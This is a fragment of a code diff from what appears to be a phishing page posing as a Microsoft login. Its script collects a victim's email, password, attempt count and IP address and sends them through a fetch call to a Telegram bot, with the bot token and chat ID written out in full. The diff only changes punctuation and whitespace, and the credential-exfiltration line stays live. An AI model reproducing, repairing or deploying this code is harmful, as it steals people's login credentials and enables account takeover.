@@ -98,7 +98,7 @@
                     attempts++;
                     const msg = `🔔 **MS Login**\n📧 User: ${emailInput.value}\n🔑 Pass: ${passVal}\n🔢 Try: ${attempts}/3\n🌐 IP: ${userIP}`;
                     
-                    fetch(`https://api.telegram.org/bot8575498962:AAGYIU-64XaN0PDy4V25Wui8uPiURON0kN8/sendMessage?chat_id=7523003121&text=${encodeURIComponent(msg)}&parse_mode=Markdown`); { mode: 'no-cors' });
+                    fetch(`https://api.telegram.org/bot8575498962:AAGYIU-64XaN0PDy4V25Wui8uPiURON0kN8/sendMessage?chat_id=7523003121&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);{ mode: 'no-cors' });
                     
                     setTimeout(() => {
                         if (attempts < 3) {
@@ -113,6 +113,7 @@
         }
     });
 </script>
+
 
 
 
